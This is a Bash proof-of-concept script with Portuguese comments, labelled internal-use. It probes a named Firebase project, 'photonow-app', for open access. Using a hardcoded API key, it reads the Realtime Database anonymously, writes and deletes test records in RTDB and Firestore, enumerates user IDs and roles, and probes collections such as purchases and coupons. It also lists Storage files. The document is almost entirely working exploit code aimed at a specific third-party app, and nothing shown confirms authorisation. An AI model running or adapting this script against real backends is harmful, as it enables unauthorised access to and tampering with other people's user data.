#!/usr/bin/env bash
# PoC de verificação — PhotoNow Firebase (uso interno apenas)
# Uso: ./poc-firebase-photonow.sh | tee evidencia-poc.txt
set -euo pipefail

API_KEY="AIzaSyBlEgFftjgHDznfDiLGxTup9otxIxE6B4U"
RTDB="https://photonow-app-default-rtdb.firebaseio.com"
FS="https://firestore.googleapis.com/v1/projects/photonow-app/databases/(default)/documents"
STORAGE="https://firebasestorage.googleapis.com/v0/b/photonow-app.appspot.com/o"

echo "=== PoC PhotoNow Firebase — $(date -Iseconds) ==="

echo -e "\n[1] RTDB shallow read"
RTDB_SIZE=$(curl -s "${RTDB}/.json?shallow=true" | wc -c)
echo "Bytes retornados: ${RTDB_SIZE}"
if [[ "${RTDB_SIZE}" -gt 100 ]]; then
  echo "STATUS: possível leitura pública (vulnerável)"
else
  echo "STATUS: poucos dados ou bloqueado"
fi

echo -e "\n[2] RTDB write test"
HTTP_PUT=$(curl -s -o /tmp/rtdb_put.json -w "%{http_code}" -X PUT \
  "${RTDB}/_poc_seguranca.json" \
  -H "Content-Type: application/json" \
  -d '{"poc":true}')
echo "PUT HTTP: ${HTTP_PUT}"
cat /tmp/rtdb_put.json
READ=$(curl -s "${RTDB}/_poc_seguranca.json")
echo "Leitura após write: ${READ}"
curl -s -X DELETE "${RTDB}/_poc_seguranca.json" >/dev/null
echo "Cleanup RTDB: OK"

echo -e "\n[3] Firestore users (apenas UID + roles, sem PII)"
HTTP_USERS=$(curl -s -o /tmp/fs_users.json -w "%{http_code}" \
  "${FS}/users?pageSize=3" \
  -H "X-Goog-Api-Key: ${API_KEY}")
echo "GET users HTTP: ${HTTP_USERS}"
python3 -c "
import json
d=json.load(open('/tmp/fs_users.json'))
if 'error' in d:
    print('ERRO:', d['error'].get('message','?'))
else:
    docs=d.get('documents',[])
    print(f'Documentos: {len(docs)}')
    for doc in docs:
        f=doc['fields']
        uid=doc['name'].split('/')[-1]
        roles=[x.get('stringValue') for x in f.get('role',{}).get('arrayValue',{}).get('values',[])]
        print(f'  - {uid}: roles={roles}')
"

echo -e "\n[4] Firestore write test"
RESP=$(curl -s -X POST "${FS}/_poc_seguranca" \
  -H "X-Goog-Api-Key: ${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"fields":{"poc":{"booleanValue":true}}}')
DOC=$(echo "${RESP}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('name',''))" 2>/dev/null || true)
if [[ -n "${DOC}" ]]; then
  echo "Doc criado: ${DOC}"
  curl -s -X DELETE "https://firestore.googleapis.com/v1/${DOC}" \
    -H "X-Goog-Api-Key: ${API_KEY}" >/dev/null
  echo "Cleanup Firestore: OK"
else
  echo "Escrita negada ou erro:"
  echo "${RESP}" | head -c 300
fi

echo -e "\n[5] Firestore coleções (1 doc cada)"
for col in totem userFranqueado compras molduras cupons; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "${FS}/${col}?pageSize=1" \
    -H "X-Goog-Api-Key: ${API_KEY}")
  echo "  ${col}: HTTP ${code}"
done

echo -e "\n[6] Storage list (max 3)"
curl -s "${STORAGE}?maxResults=3" -H "X-Firebase-Storage-Key: ${API_KEY}" \
| python3 -c "
import json,sys
d=json.load(sys.stdin)
if 'error' in d:
    print('ERRO:', d['error'].get('message','?'))
else:
    for it in d.get('items',[]):
        print(' ', it.get('name'))
" 2>/dev/null || echo "(parse error)"

echo -e "\n=== Fim do PoC ==="
